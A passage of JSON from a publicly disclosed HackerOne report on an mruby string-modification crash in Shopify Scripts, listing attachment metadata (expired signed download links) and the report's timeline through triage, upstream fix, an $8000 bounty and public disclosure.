wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=4dd6f7842962ea9e7ec7878c267b4bfdfbc8ed21221ed7c429dc2bb7fd36b775","file_size":4703,"type":"application/octet-stream"},{"id":135304,"file_name":"mrb_str_modify.crash.log","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/304/227543e55a0f26a079b00e9477a3b16a8e78e206/mrb_str_modify.crash.log?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.crash.log%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.crash.log\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044621Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=d4f9bfa6ad5b7b49308a52f4096cb006a8801aff21c89a7c0b8694f37b7c8477","file_size":32591,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-01-15T19:57:14.607Z","allow_singular_disclosure_after":-124706947.04305664,"singular_disclosure_allowed":true,"vote_count":5,"voters":["mpz","eveeez","spetr0x","scept1c","no-longer-with-company"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1306660,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is investigating.","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue, and our engineering team is investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-18T13:01:24.346Z","updated_at":"2016-11-18T13:01:24.346Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1306661,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-18T13:01:31.001Z","updated_at":"2016-11-18T13:01:31.001Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":8135},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1313791,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @jpenalbae,\n\nThanks again for the report. We recently deployed a fix to our production environment.\n\nI'm marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact \u0026 determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jpenalbae\"\u003e@jpenalbae\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks again for the report. We recently deployed a fix to our production environment.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact \u0026amp; determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-22T21:17:17.753Z","updated_at":"2016-11-22T21:17:17.753Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jpenalbae","url":"/jpenalbae"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1319239,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The fix for this has been merged upstream: https://github.com/mruby/mruby/pull/3279/files","markdown_message":"\u003cp\u003eThe fix for this has been merged upstream: \u003ca title=\"https://github.com/mruby/mruby/pull/3279/files\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fpull%2F3279%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/pull/3279/files\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-25T15:54:34.809Z","updated_at":"2016-11-25T15:54:34.809Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370057,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify Scripts and the mruby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-16T19:57:08.352Z","updated_at":"2016-12-16T19:57:08.352Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"8000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"jpenalbae","url":"/jpenalbae"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370058,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T19:57:14.594Z","updated_at":"2016-12-16T19:57:14.594Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370763,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-17T02:30:01.937Z","updated_at":"2016-12-17T02:30:01.937Z","actor":{"username":"jpenalbae","cleared":false,"url":"/jpenalbae","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370764,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-17T02:30:02.009Z","updated_at":"2016-12-17T02:30:02.009Z","actor":{"username":"jpenalbae","cleared":false,"url":"/jpenalbae","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}